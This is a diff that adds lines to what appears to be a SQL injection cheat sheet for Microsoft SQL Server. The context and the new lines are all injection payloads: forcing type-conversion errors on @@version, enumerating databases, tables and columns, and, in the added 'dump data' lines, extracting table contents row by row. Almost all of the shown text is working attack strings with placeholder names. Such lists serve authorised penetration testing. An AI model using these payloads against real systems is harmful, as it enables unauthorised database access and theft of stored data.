@@ -3308,6 +3308,9 @@ convert(int,@@version)
 ' + cast((SELECT @@version) as int) + '
 ' + convert(int,@@version) + '
 
+### force conversion to string needed to provoke error? --> concatenation with char
+(SELECT TOP 1 CAST(column_here as varchar)%2bchar(64) FROM database_here..table_name_here WHERE column_here NOT IN ('known_data1_here','known_data2_here')); --
+
 ## possible replacements for @@version
 ### database name
 db_name() # current db
@@ -3327,6 +3330,9 @@ user_name()
 (select+top+1+column_name+from+information_schema.columns+where+table_name='table_name_here') # first column
 (select+top+1+column_name+from+information_schema.columns+where+table_name='table_name_here'+and+column_name+not+in+('first_column_name_here')) # subsequent columns
 (SELECT TOP 1 CAST(database_here..syscolumns.name as varchar(4096) FROM database_here..syscolumns, database_here..sysobjects WHERE database_here..syscolumns.id=database_here..sysobjects.id AND database_here..sysobjects.name=table_name_here AND database_here..sysobjects.name NOT IN ('known_column_name1_here','known_column_name2_here')); --
+
+### dump data
+(SELECT TOP 1 CAST(column_here as varchar(4096) FROM database_here..table_name_here WHERE column_name NOT IN ('known_data1_here','known_data2_here')); --
 ```
 
 
